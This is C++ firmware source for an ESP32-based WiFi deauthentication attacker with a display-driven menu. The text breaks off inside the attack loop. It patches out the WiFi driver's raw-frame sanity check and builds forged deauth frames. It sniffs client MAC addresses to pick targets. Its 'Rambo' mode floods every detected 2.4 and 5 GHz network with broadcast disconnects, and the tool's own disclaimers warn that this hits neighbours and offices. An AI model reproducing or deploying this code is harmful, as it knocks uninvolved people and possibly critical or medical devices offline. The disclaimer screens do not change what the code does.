#include "Deauther.h"

#include "DisplayTFT.h"

#include <WiFi.h>

#include "esp_wifi.h"

#include "PepeDraw.h"

#include "Pins.h"

#include "SoundUtils.h"

#include "WifiCore.h"

#include "cap.h"   // Typed 802.11 frame structs (ESP32-S3 port of BW16 cap)

#include <vector>



extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════

// PATCH · anula the validacion of frames 802.11

// Este override only funciona if aplico the comando objcopy --weaken-symbol

// about libnet80211.a (ver README of the proyecto)

// ═══════════════════════════════════════════════════════════════════════════

extern "C" __attribute__((weak)) int ieee80211_raw_frame_sanity_check(int32_t arg,

                                                 int32_t arg2,

                                                 int32_t arg3) {

    return 0;   // always permitir

}



// ═══════════════════════════════════════════════════════════════════════════

// Configuration

// ═══════════════════════════════════════════════════════════════════════════

#define MAX_APS             120

#define MAX_CLIENTS         15

#define VISIBLE_ROWS        5

#define CLIENT_SCAN_TIME_S  15



// ═══════════════════════════════════════════════════════════════════════════

// ESTRUCTURAS

// ═══════════════════════════════════════════════════════════════════════════

struct APInfo {

    String      ssid;

    uint8_t     bssid[6];

    int         channel;

    int         rssi;

    String      bssidStr;

    WifiBand    band;

    RadioSource radio;

};



struct ClientInfo {

    uint8_t  mac[6];

    String   macStr;

    int      rssi;

    unsigned long lastSeen;

};



static APInfo     aps[MAX_APS];

static int        apCount = 0;

static ClientInfo clients[MAX_CLIENTS];

static int        clientCount = 0;



// State of the attack

static volatile unsigned long deauthPackets = 0;

static APInfo     activeAP;

static uint8_t    activeTargetMac[6];

static bool       broadcastMode = false;    // true = all the clientes of the AP

static bool       ramboMode     = false;    // true = all the APs (channel hop)



// Dynamic Rambo Channels collected from unified scan

static uint8_t dynamicRamboChannels[MAX_APS];

static int     dynamicRamboChannelCount = 0;



// ═══════════════════════════════════════════════════════════════════════════

// DEAUTH FRAME TEMPLATE

// Frame Control: type=Management (0x00), subtype=Deauthentication (0x0C)

// → first byte = 0xC0 (subtype deauth + management)

// ═══════════════════════════════════════════════════════════════════════════

static uint8_t deauthFrame[26] = {

    0xC0, 0x00,                          // Frame Control: deauth

    0x00, 0x00,                          // Duration

    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination ( llena dinámico)

    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (BSSID of the AP)

    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (of the AP)

    0x00, 0x00,                          // Sequence

    0x07, 0x00                           // Reason code 7 = Class 3 frame

};



// ═══════════════════════════════════════════════════════════════════════════

// HELPERS

// ═══════════════════════════════════════════════════════════════════════════



// Formats 6 bytes as "AA:BB:CC:DD:EE:FF"

static String macToStr(const uint8_t mac[6]) {

    char buf[18];

    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",

             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return String(buf);

}



static int rssiBars(int rssi) {

    if (rssi >= -55) return 4;

    if (rssi >= -70) return 3;

    if (rssi >= -85) return 2;

    if (rssi >= -95) return 1;

    return 0;

}



static String formatTime(unsigned long ms) {

    unsigned long s = ms / 1000;

    unsigned long h = s / 3600;

    unsigned long m = (s % 3600) / 60;

    unsigned long sec = s % 60;

    char buf[12];

    snprintf(buf, sizeof(buf), "%02lu:%02lu:%02lu", h, m, sec);

    return String(buf);

}



// sends 1 deauth frame usando the typed DeauthFrame struct (port of BW16 cap.cpp)

// BW16: wifi_tx_deauth_frame(src, dst, reason)

// ESP32: wifi_tx_raw_frame → esp_wifi_80211_tx

static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {

    // Forward → typed API in cap.cpp (mirrors BW16 wifi_tx_deauth_frame)

    bool ok = wifi_tx_deauth_frame(

        (void*)bssid,    // src_mac = AP BSSID

        (void*)target,   // dst_mac = target STA or broadcast

        0x0007           // reason 7 = Class 3 frame from non-associated STA

    );

    if (ok) deauthPackets++;  // only count frames actually accepted by driver

}



// ═══════════════════════════════════════════════════════════════════════════

// DISCLAIMER REFORZADO

// ═══════════════════════════════════════════════════════════════════════════

static bool showDisclaimer() {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, TFT_RED);

    tft.drawRect(1, 1, 318, 238, TFT_RED);



    drawStringBig(70, 8, "DEAUTHER", TFT_RED, 2);

    tft.drawFastHLine(0, 46, 320, TFT_RED);



    int y = 54;

    drawStringCustom(10, y, "This tool disconnects",            UI_MAIN, 1); y += 12;

    drawStringCustom(10, y, "devices from their WiFi network.", UI_MAIN, 1); y += 20;



    drawStringCustom(10, y, "LEGAL USE:",                     TFT_GREEN, 1); y += 12;

    drawStringCustom(20, y, "- Your own network",            UI_ACCENT, 1); y += 12;

    drawStringCustom(20, y, "- Authorized pentest target",    UI_ACCENT, 1); y += 18;



    drawStringCustom(10, y, "ILLEGAL USE:",                  TFT_RED, 1); y += 12;

    drawStringCustom(20, y, "- Unauthorized networks",       UI_ACCENT, 1); y += 12;

    drawStringCustom(20, y, "- Critical / medical systems",   UI_ACCENT, 1); y += 12;

    drawStringCustom(20, y, "- Public infrastructure",        UI_ACCENT, 1); y += 18;



    drawStringCustom(10, y, "Misuse violates federal law.",     TFT_RED, 1);



    tft.drawFastHLine(0, 212, 320, TFT_RED);

    drawStringCustom(10, 220, "OK: UNDERSTAND   BACK: EXIT",         UI_ACCENT, 1);



    while (true) {

        if (navEnterPressed()) {

            beep(2200, 60);

            while (navEnterPressed() || navBackPressed()) delay(5);

            delay(100);

            return true;

        }

        if (navBackPressed() || navUpPressed() || navDownPressed()) {

            beep(800, 100);

            while (navBackPressed() || navUpPressed() || navDownPressed())

                delay(5);

            delay(100);

            return false;

        }

        delay(20);

    }

}



// ═══════════════════════════════════════════════════════════════════════════

// SCAN of APs (DUAL-BAND UNIFIED SCAN 2.4G + 5G)

// ═══════════════════════════════════════════════════════════════════════════

static void scanAPs() {

    apCount = 0;

    dynamicRamboChannelCount = 0;



    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "DEAUTHER", UI_MAIN, 1);

    tft.drawFastHLine(0, 30, 320, UI_ACCENT);



    drawStringCustom(10, 50, "Scanning Dual-Band APs...", UI_MAIN, 1);

    drawStringCustom(10, 62, "2.4 GHz (S3) + 5 GHz (C5)", TFT_CYAN, 1);



    int barX = 10, barY = 90, barW = 300, barH = 14;

    tft.drawRect(barX, barY, barW, barH, UI_ACCENT);



    std::vector<NetworkObservation> scanResults;

    int n = performUnifiedScan(scanResults, 6000);



    if (n > MAX_APS) n = MAX_APS;



    // Copiar resultados al array of APs

    for (int i = 0; i < n; i++) {

        aps[i].ssid     = scanResults[i].ssid;

        aps[i].rssi     = scanResults[i].rssi;

        aps[i].channel  = scanResults[i].channel;

        aps[i].band     = scanResults[i].band;

        aps[i].radio    = scanResults[i].radio;

        aps[i].bssidStr = scanResults[i].bssidStr;

        memcpy(aps[i].bssid, scanResults[i].bssid, 6);



        if (aps[i].ssid.length() == 0) aps[i].ssid = "<hidden>";



        // Build dynamic unique channel list for Rambo mode

        bool exists = false;

        for (int c = 0; c < dynamicRamboChannelCount; c++) {

            if (dynamicRamboChannels[c] == aps[i].channel) {

                exists = true;

                break;

            }

        }

        if (!exists && dynamicRamboChannelCount < MAX_APS) {

            dynamicRamboChannels[dynamicRamboChannelCount++] = (uint8_t)aps[i].channel;

        }

    }

    apCount = n;



    // Fallback if no channels discovered

    if (dynamicRamboChannelCount == 0) {

        dynamicRamboChannels[0] = 1;

        dynamicRamboChannels[1] = 6;

        dynamicRamboChannels[2] = 11;

        dynamicRamboChannelCount = 3;

    }



    // Ordenar by RSSI desc

    for (int i = 0; i < apCount - 1; i++) {

        for (int j = 0; j < apCount - 1 - i; j++) {

            if (aps[j].rssi < aps[j + 1].rssi) {

                APInfo tmp = aps[j];

                aps[j]     = aps[j + 1];

                aps[j + 1] = tmp;

            }

        }

    }



    tft.fillRect(barX + 1, barY + 1, barW - 2, barH - 2, UI_SELECT);

    tft.fillRect(10, 115, 250, 20, TFT_BLACK);

    drawStringCustom(10, 115, "FOUND: " + String(apCount) + " APs", apCount > 0 ? TFT_GREEN : TFT_RED, 2);



    beep(2000, 40);

    delay(500);

}



// AP SELECTION (+ Rambo + Rescan + Back)

static void drawAPList(int cursor, int scrollOffset) {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, UI_MAIN);



    drawStringBig(10, 8, "SELECT AP", UI_MAIN, 1);

    drawStringCustom(230, 12, "[" + String(apCount) + " APs]", UI_ACCENT, 1);

    tft.drawFastHLine(0, 30, 320, UI_ACCENT);



    // Items: RAMBO (0), APs (1..apCount), RESCAN, BACK

    int totalItems = apCount + 2;

    const int rowH = 32;

    const int listY = 36;



    for (int i = 0; i < VISIBLE_ROWS; i++) {

        int idx = i + scrollOffset;

        if (idx >= totalItems) break;



        int y = listY + i * rowH;

        bool selected = (idx == cursor);



        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);



        uint16_t colMain = selected ? UI_BG : UI_MAIN;

        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;



        if (idx == 0) {

            // RAMBO MODE

            drawStringCustom(10, y + 6,  "[!] RAMBO: ALL FOUND CHANNELS",

                             selected ? UI_BG : TFT_RED, 2);

            drawStringCustom(10, y + 20, "Hop across " + String(dynamicRamboChannelCount) + " detected channels",

                             colSub, 1);

        } else if (idx == apCount + 1) {

            drawStringCustom(10, y + 10, "< RESCAN", colMain, 2);

        } else {

            int apIdx = idx - 1;

            APInfo& a = aps[apIdx];



            // Band Badge

            uint16_t tagColor = selected ? UI_BG : (a.band == BAND_5G ? TFT_CYAN : TFT_GREEN);

            String bandTag = (a.band == BAND_5G) ? "[5G]" : "[2.4G]";

            drawStringCustom(10, y + 4, bandTag, tagColor, 1);



            String s = a.ssid;

            if (getTextWidth(s, 2) <= 210) {

                drawStringCustom(48, y + 4, s, colMain, 2);

            } else {

                drawStringFit(48, y + 8, s, colMain, 210, 1);

            }



            String meta = "CH" + String(a.channel) + " " +

                          String(a.rssi) + "dBm (" + (a.radio == RADIO_C5_5G ? "C5" : "S3") + ")";

            drawStringCustom(48, y + 20, meta, colSub, 1);



            // Signal Bars

            int bars = rssiBars(a.rssi);

            int bx = 285, by = y + 24;

            for (int b = 0; b < 4; b++) {

                int bh = 3 + b * 2;

                uint16_t c = (b < bars)

                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :

                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))

                    : (selected ? UI_BG : UI_ACCENT);

                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);

                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);

            }

        }

    }



    // Scroll bar

    if (totalItems > VISIBLE_ROWS) {

        int barH = (VISIBLE_ROWS * 176) / totalItems;

        int barY = 36 + (scrollOffset * (176 - barH)) / (totalItems - VISIBLE_ROWS);

        tft.fillRect(314, barY, 4, barH, UI_ACCENT);

    }



    tft.drawFastHLine(0, 215, 320, UI_ACCENT);

    drawStringCustom(10, 222, "OK:SELECT  BACK/OK(H):BACK", UI_ACCENT, 1);

}



static int selectAP() {

    int cursor = 1;   // start in the first AP real, no in RAMBO

    int scrollOffset = 0;

    int totalItems = apCount + 2;



    drawAPList(cursor, scrollOffset);



    while (true) {

        if (navBackPressed()) {

            beep(1000, 40);

            while (navBackPressed()) delay(5);

            return -3;

        }

        if (navUpPressed()) {

            cursor = (cursor - 1 + totalItems) % totalItems;

            if (cursor < scrollOffset) scrollOffset = cursor;

            if (cursor >= scrollOffset + VISIBLE_ROWS)

                scrollOffset = cursor - VISIBLE_ROWS + 1;

            beep(2100, 20);

            drawAPList(cursor, scrollOffset);

            delay(70);

        }

        if (navDownPressed()) {

            cursor = (cursor + 1) % totalItems;

            if (cursor < scrollOffset) scrollOffset = cursor;

            if (cursor >= scrollOffset + VISIBLE_ROWS)

                scrollOffset = cursor - VISIBLE_ROWS + 1;

            beep(2100, 20);

            drawAPList(cursor, scrollOffset);

            delay(70);

        }

        if (navEnterPressed()) {

            bool held = waitOkReleaseWasLong();

            beep(held ? 1000 : 1800, 40);

            delay(100);

            if (held) return -3;



            if (cursor == 0)              return -1;   // RAMBO

            if (cursor == apCount + 1)    return -2;   // RESCAN

            return cursor - 1;                          // índice AP real

        }

        delay(20);

    }

}



// ═══════════════════════════════════════════════════════════════════════════

// RAMBO DISCLAIMER

// ═══════════════════════════════════════════════════════════════════════════

static bool confirmRambo() {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, TFT_RED);

    tft.drawRect(1, 1, 318, 238, TFT_RED);



    drawStringBig(60, 10, "RAMBO MODE", TFT_RED, 2);

    tft.drawFastHLine(0, 48, 320, TFT_RED);



    int y = 58;

    drawStringCustom(10, y, "Will attack ALL nearby WiFi",   UI_MAIN, 1); y += 12;

    drawStringCustom(10, y, "networks detected.",            UI_MAIN, 1); y += 20;



    String chanInfo = "Active channels: " + String(dynamicRamboChannelCount) + " hop";

    drawStringCustom(10, y, chanInfo,                          TFT_CYAN, 1); y += 20;



    drawStringCustom(10, y, "!! AFFECTS THIRD PARTIES !!",    TFT_RED, 1); y += 12;

    drawStringCustom(10, y, "!! NEIGHBORS, OFFICES, ETC !!",    TFT_RED, 1); y += 20;



    drawStringCustom(10, y, "Use only in your own",          UI_MAIN, 1); y += 12;

    drawStringCustom(10, y, "isolated physical lab.",         UI_MAIN, 1); y += 20;



    drawStringCustom(10, y, "100% your responsibility.",      TFT_YELLOW, 1);



    tft.drawFastHLine(0, 212, 320, TFT_RED);

    drawStringCustom(10, 220, "OK: CONTINUE   BACK/UP/DN: CANCEL", UI_ACCENT, 1);



    while (true) {

        if (navEnterPressed()) {

            beep(2200, 60);

            while (navEnterPressed() || navBackPressed()) delay(5);

            delay(100);

            return true;

        }

        if (navBackPressed() || navUpPressed() || navDownPressed()) {

            beep(800, 100);

            while (navBackPressed() || navUpPressed() || navDownPressed())

                delay(5);

            delay(100);

            return false;

        }

        delay(20);

    }

}



// ═══════════════════════════════════════════════════════════════════════════

// MENÚ of ACCIÓN

// ═══════════════════════════════════════════════════════════════════════════

static void drawActionMenuRow(int idx, bool selected) {

    const char* items[] = {

        "Broadcast Deauth NOW",

        "Scan Clients (15s)"

    };

    const char* descs[] = {

        "Disconnect all clients",

        "Select fine target",

        ""

    };



    int y = 85 + idx * 32;

    uint16_t bg = selected ? UI_SELECT : UI_BG;

    uint16_t colMain = selected ? UI_BG : UI_MAIN;

    uint16_t colSub  = selected ? UI_BG : UI_ACCENT;



    tft.fillRect(5, y - 2, 310, 28, bg);

    drawStringCustom(15, y + 2,  items[idx], colMain, 2);

    if (strlen(descs[idx]) > 0) {

        drawStringCustom(15, y + 18, descs[idx], colSub, 1);

    }

}



static void drawActionMenu(int cursor, const APInfo& ap) {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, UI_MAIN);



    drawStringBig(10, 8, "ACTION", UI_MAIN, 1);

    tft.drawFastHLine(0, 30, 320, UI_ACCENT);



    String bandTag = (ap.band == BAND_5G) ? "[5GHz C5] " : "[2.4GHz S3] ";

    drawStringFit(10, 36, "AP: " + bandTag + ap.ssid, UI_SELECT, 300, 1);

    drawStringCustom(10, 48, "BSSID: " + ap.bssidStr, UI_ACCENT, 1);

    drawStringCustom(10, 60, "Band: " + String(ap.band == BAND_5G ? "5 GHz" : "2.4 GHz") +

                     "  CH: " + String(ap.channel) + "  RSSI: " + String(ap.rssi) + "dBm", UI_ACCENT, 1);

    tft.drawFastHLine(0, 75, 320, UI_ACCENT);



    for (int i = 0; i < 2; i++) drawActionMenuRow(i, i == cursor);



    tft.drawFastHLine(0, 215, 320, UI_ACCENT);

    drawStringCustom(10, 222, "OK:SELECT  BACK/OK(H):BACK", UI_ACCENT, 1);

}



static int selectAction(const APInfo& ap) {

    int cursor = 0;

    drawActionMenu(cursor, ap);



    while (true) {

        if (navBackPressed()) {

            beep(1000, 40);

            while (navBackPressed()) delay(5);

            return -1;

        }

        if (navUpPressed()) {

            int oldCursor = cursor;

            cursor = (cursor - 1 + 2) % 2;

            beep(2100, 20);

            tft.startWrite();

            drawActionMenuRow(oldCursor, false);

            drawActionMenuRow(cursor, true);

            tft.endWrite();

            delay(70);

        }

        if (navDownPressed()) {

            int oldCursor = cursor;

            cursor = (cursor + 1) % 2;

            beep(2100, 20);

            tft.startWrite();

            drawActionMenuRow(oldCursor, false);

            drawActionMenuRow(cursor, true);

            tft.endWrite();

            delay(70);

        }

        if (navEnterPressed()) {

            bool held = waitOkReleaseWasLong();

            beep(held ? 1000 : 1800, 40);

            delay(100);

            if (held) return -1;

            return cursor;

        }

        delay(20);

    }

}



// ═══════════════════════════════════════════════════════════════════════════

// SCAN of CLIENTES (mode promiscuo filtrando by BSSID of the AP)

// ═══════════════════════════════════════════════════════════════════════════

static uint8_t scanTargetBSSID[6];



static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {

    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    if (clientCount >= MAX_CLIENTS) return;



    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;

    uint8_t* payload = pkt->payload;



    uint8_t* addr1 = &payload[4];

    uint8_t* addr2 = &payload[10];

    uint8_t* addr3 = &payload[16];



    uint8_t* clientMac = nullptr;



    if (memcmp(addr3, scanTargetBSSID, 6) == 0 &&

        memcmp(addr2, scanTargetBSSID, 6) != 0) {

        clientMac = addr2;

    } else if (memcmp(addr2, scanTargetBSSID, 6) == 0 &&

               memcmp(addr1, scanTargetBSSID, 6) != 0 &&

               addr1[0] != 0xFF) {

        clientMac = addr1;

    }



    if (!clientMac) return;

    if (clientMac[0] & 0x01) return;



    for (int i = 0; i < clientCount; i++) {

        if (memcmp(clients[i].mac, clientMac, 6) == 0) {

            clients[i].rssi = pkt->rx_ctrl.rssi;

            clients[i].lastSeen = millis();

            return;

        }

    }



    memcpy(clients[clientCount].mac, clientMac, 6);

    clients[clientCount].macStr = macToStr(clientMac);

    clients[clientCount].rssi   = pkt->rx_ctrl.rssi;

    clients[clientCount].lastSeen = millis();

    clientCount++;

}



static void scanClients(const APInfo& ap) {

    clientCount = 0;

    memcpy(scanTargetBSSID, ap.bssid, 6);



    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "SCAN CLIENTS", UI_MAIN, 1);

    tft.drawFastHLine(0, 30, 320, UI_ACCENT);



    drawStringCustom(10, 40, "AP: " + ap.ssid, UI_SELECT, 1);

    drawStringCustom(10, 52, "CH " + String(ap.channel) + " (" + (ap.band == BAND_5G ? "5GHz" : "2.4GHz") +

                             ") - " + String(CLIENT_SCAN_TIME_S) + "s sniff",

                     UI_ACCENT, 1);



    int barX = 10, barY = 80, barW = 300, barH = 14;

    tft.drawRect(barX, barY, barW, barH, UI_ACCENT);



    if (ap.band == BAND_5G) {

        c5SetChannel(ap.channel);

        c5SetSniffer(true);

    } else {

        // Don't call esp_wifi_init() — may already be initialized.

        // Cleanly reset to STA mode, set channel, then enable promiscuous.

        WiFi.scanDelete();

        esp_wifi_set_promiscuous(false);

        delay(20);

        WiFi.mode(WIFI_STA);

        WiFi.disconnect();

        delay(50);

        esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

        esp_wifi_set_promiscuous(true);

        esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);

    }



    unsigned long scanStart = millis();

    int lastDrawnCount = -1;



    while (millis() - scanStart < CLIENT_SCAN_TIME_S * 1000UL) {

        float progress = (float)(millis() - scanStart) /

                         (CLIENT_SCAN_TIME_S * 1000.0f);

        int fillW = (int)((barW - 2) * progress);

        tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, UI_SELECT);



        if (clientCount != lastDrawnCount) {

            tft.fillRect(10, 105, 300, 100, TFT_BLACK);

            drawStringCustom(10, 105, "Clients: " + String(clientCount),

                             TFT_GREEN, 2);



            int yy = 125;

            int show = clientCount;

            if (show > 5) show = 5;

            for (int i = 0; i < show; i++) {

                String line = "- " + clients[i].macStr +

                              " (" + String(clients[i].rssi) + ")";

                drawStringCustom(10, yy, line, UI_ACCENT, 1);

                yy += 12;

            }

            if (clientCount > 5) {

                drawStringCustom(10, yy, "...+" + String(clientCount - 5) +

                                 " more", UI_ACCENT, 1);

            }

            lastDrawnCount = clientCount;

        }

        delay(150);

    }



    if (ap.band == BAND_5G) {

        c5SetSniffer(false);

    } else {

        esp_wifi_set_promiscuous(false);

        WiFi.mode(WIFI_STA);

        WiFi.disconnect();

    }

    delay(50);



    for (int i = 0; i < clientCount - 1; i++) {

        for (int j = 0; j < clientCount - 1 - i; j++) {

            if (clients[j].rssi < clients[j + 1].rssi) {

                ClientInfo tmp = clients[j];

                clients[j]     = clients[j + 1];

                clients[j + 1] = tmp;

            }

        }

    }



    beep(2000, 40);

    delay(20);

    beep(2400, 60);

}



// TARGET SELECTION

static void drawClientList(int cursor, int scrollOffset) {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, UI_MAIN);



    drawStringBig(10, 8, "SELECT TARGET", UI_MAIN, 1);

    drawStringCustom(230, 12, "[" + String(clientCount) + " clients]",

                     UI_ACCENT, 1);

    tft.drawFastHLine(0, 30, 320, UI_ACCENT);



    int totalItems = clientCount + 2;

    const int rowH = 28;

    const int listY = 36;



    for (int i = 0; i < VISIBLE_ROWS + 1; i++) {

        int idx = i + scrollOffset;

        if (idx >= totalItems) break;



        int y = listY + i * rowH;

        bool selected = (idx == cursor);



        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);



        uint16_t colMain = selected ? UI_BG : UI_MAIN;

        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;



        if (idx == 0) {

            drawStringCustom(10, y + 4, "ALL CLIENTS", colMain, 2);

            drawStringCustom(10, y + 18, "Broadcast deauth (FF:FF:FF..)",

                             colSub, 1);

        } else if (idx == clientCount + 1) {

            drawStringCustom(10, y + 7, "< RESCAN", colMain, 2);

        } else {

            int cIdx = idx - 1;

            ClientInfo& c = clients[cIdx];

            drawStringCustom(10, y + 4, c.macStr, colMain, 2);

            drawStringCustom(10, y + 18, String(c.rssi) + " dBm",

                             colSub, 1);



            int bars = rssiBars(c.rssi);

            int bx = 280, by = y + 20;

            for (int b = 0; b < 4; b++) {

                int bh = 3 + b * 2;

                uint16_t col = (b < bars)

                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :

                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))

                    : (selected ? UI_BG : UI_ACCENT);

                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, col);

                else          tft.drawRect(bx + b*5, by - bh, 3, bh, col);

            }

        }

    }



    tft.drawFastHLine(0, 215, 320, UI_ACCENT);

    drawStringCustom(10, 222, "OK:DEAUTH  BACK/OK(H):BACK", UI_ACCENT, 1);

}



static int selectTarget() {

    int cursor = 0;

    int scrollOffset = 0;

    int totalItems = clientCount + 2;



    drawClientList(cursor, scrollOffset);



    while (true) {

        if (navBackPressed()) {

            beep(1000, 40);

            while (navBackPressed()) delay(5);

            return -3;

        }

        if (navUpPressed()) {

            cursor = (cursor - 1 + totalItems) % totalItems;

            if (cursor < scrollOffset) scrollOffset = cursor;

            if (cursor >= scrollOffset + VISIBLE_ROWS)

                scrollOffset = cursor - VISIBLE_ROWS + 1;

            beep(2100, 20);

            drawClientList(cursor, scrollOffset);

            delay(70);

        }

        if (navDownPressed()) {

            cursor = (cursor + 1) % totalItems;

            if (cursor < scrollOffset) scrollOffset = cursor;

            if (cursor >= scrollOffset + VISIBLE_ROWS)

                scrollOffset = cursor - VISIBLE_ROWS + 1;

            beep(2100, 20);

            drawClientList(cursor, scrollOffset);

            delay(70);

        }

        if (navEnterPressed()) {

            bool held = waitOkReleaseWasLong();

            beep(held ? 1000 : 1800, 40);

            delay(100);

            if (held) return -3;



            if (cursor == 0)              return -1;   // ALL

            if (cursor == clientCount + 1) return -2;  // RESCAN

            return cursor - 1;

        }

        delay(20);

    }

}



// ═══════════════════════════════════════════════════════════════════════════

// screen of attack

// ═══════════════════════════════════════════════════════════════════════════

static void drawAttackFrame() {

    tft.fillScreen(TFT_BLACK);

    tft.drawRect(0, 0, 320, 240, TFT_RED);

    tft.drawRect(1, 1, 318, 238, TFT_RED);



    drawStringBig(10, 10, "DEAUTHING", TFT_RED, 1);

    drawStringCustom(225, 16, "[ACTIVE]", TFT_GREEN, 1);

    tft.drawFastHLine(0, 36, 320, TFT_RED);



    // Info

    if (ramboMode) {

        drawStringCustom(10, 44, "Mode:   RAMBO (All Detected Channels)", UI_MAIN, 1);

        drawStringCustom(10, 58, "Hops:   " + String(dynamicRamboChannelCount) + " channels (2.4G & 5G)", TFT_CYAN, 1);

        drawStringCustom(10, 72, "Targets: broadcast", UI_MAIN, 1);

    } else {

        String s = activeAP.ssid;

        drawStringFit(10, 44, "AP:     " + s, UI_MAIN, 300, 1);

        if (broadcastMode) {

            drawStringCustom(10, 58, "Target: ALL (broadcast)", UI_MAIN, 1);

        } else {

            drawStringCustom(10, 58, "Target: " + macToStr(activeTargetMac),

                             UI_MAIN, 1);

        }

        String radStr = (activeAP.band == BAND_5G) ? "5 GHz [Radio: C5]" : "2.4 GHz [Radio: S3]";

        drawStringCustom(10, 72, "CH " + String(activeAP.channel) + "  " + radStr,

                         activeAP.band == BAND_5G ? TFT_CYAN : TFT_GREEN, 1);

    }



    tft.drawFastHLine(10, 86, 300, UI_ACCENT);



    drawStringCustom(10, 100, "Time:",    UI_ACCENT, 1);

    drawStringCustom(10, 128, "Packets:", UI_ACCENT, 1);

    drawStringCustom(10, 156, "Rate:",    UI_ACCENT, 1);



    tft.drawRect(10, 185, 300, 14, UI_ACCENT);



    tft.drawFastHLine(0, 212, 320, TFT_RED);

    drawStringCustom(10, 220, "BACK / OK(HOLD): STOP", TFT_RED, 1);

}



static void drawAttackStats(unsigned long elapsed, unsigned long pkts,

                            float rate) {

    tft.fillRect(100, 96, 210, 14, TFT_BLACK);

    drawStringCustom(100, 100, formatTime(elapsed), TFT_YELLOW, 2);



    tft.fillRect(100, 124, 210, 14, TFT_BLACK);

    drawStringCustom(100, 128, String(pkts), TFT_GREEN, 2);



    tft.fillRect(100, 152, 210, 14, TFT_BLACK);

    char rbuf[24];

    snprintf(rbuf, sizeof(rbuf), "%d pkt/s", (int)rate);

    drawStringCustom(100, 156, String(rbuf), TFT_CYAN, 2);



    tft.fillRect(12, 187, 296, 10, TFT_BLACK);

    int fillW = random(60, 290);

    tft.fillRect(12, 187, fillW, 10, TFT_RED);

}



// ═══════════════════════════════════════════════════════════════════════════

// loop for attack

// ═══════════════════════════════════════════════════════════════════════════

static void runAttackLoop() {

    drawAttackFrame();

    beep(3000, 40); delay(20);

    beep(3600, 60); delay(20);

    beep(2400, 80);



    // ── Setup WiFi for raw 80211 injection ──────────────────────────────

    // WIFI_IF_AP requires softAP to be running — mode(AP_STA) alone doesn't

    // initialize the AP TX queue. Start a hidden dummy AP so WIFI_IF_AP is

    // fully up and esp_wifi_80211_tx(WIFI_IF_AP) stops returning INVALID_ARG.

    WiFi.scanDelete();

    esp_wifi_set_promiscuous(false);

    delay(30);

    WiFi.mode(WIFI_AP_STA);

    delay(50);

    WiFi.softAP("x", "", 1, 1, 0);   // hidden SSID, ch1, hidden=true, max_conn=0

    delay(100);

    esp_wifi_set_promiscuous(true);

    delay(30);

    Serial.println("[DEAUTH] WiFi ready for raw injection (AP_STA+softAP, promisc ON)");



    int ramboIdx = 0;



    if (!ramboMode) {

        if (activeAP.band == BAND_2G4) {

            esp_wifi_set_channel(activeAP.channel, WIFI_SECOND_CHAN_NONE);

            Serial.printf("[DEAUTH] Locked S3 2.4GHz Radio to Channel %d\n", activeAP.channel);

        } else {

            c5SetChannel(activeAP.channel);

            Serial.printf("[DEAUTH] Sent 5GHz Channel %d to C5\n", activeAP.channel);

        }

    } else {

        if (dynamicRamboChannelCount > 0) {

            uint8_t initCh = dynamicRamboChannels[0];

            if (is5GHzChannel(initCh)) {

                c5SetChannel(initCh);

            } else {

                esp_wifi_set_channel(initCh, WIFI_SECOND_CHAN_NONE);

            }

        }

    }



    deauthPackets = 0;

    unsigned long startMs         = millis();

    unsigned long lastStatsUpdate = millis();

    unsigned long lastChannelHop  = millis();

    unsigned long lastPktCount    = 0;

    float rate = 0;



    const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};



    bool stopAttack = false;

    unsigned long okPressStart = 0;

    bool okHeld = false;



    while (!stopAttack) {

        if (navBackPressed()) {

            stopAttack = true;

            while (navBackPressed()) delay(5);

            continue;

        }



        // ── send deauth(s) ───────────────────────────────────────────

        if (ramboMode) {

            if (dynamicRamboChannelCount > 0) {

                uint8_t curChan = dynamicRamboChannels[ramboIdx];

                bool cur5G = is5GHzChannel(curChan);

                for (int i = 0; i < apCount; i++) {

                    if (aps[i].channel == curChan) {

                        if (!cur5G) {

                            // 2.4 GHz → S3 fires directly via cap.cpp / esp_wifi_80211_tx

                            sendDeauth(broadcastMac, aps[i].bssid);

                            sendDeauth(aps[i].bssid, aps[i].bssid);

                        } else {

                            // 5 GHz → C5 co-processor fires via UART DEAUTH command

                            c5SendDeauth(aps[i].bssid, broadcastMac, 0x0007);

                            c5SendDeauth(aps[i].bssid, aps[i].bssid,  0x0007);

                        }

                    }

                }

            }

        } else {

            const uint8_t* targetMac = broadcastMode ? broadcastMac : activeTargetMac;

            if (activeAP.band == BAND_2G4) {

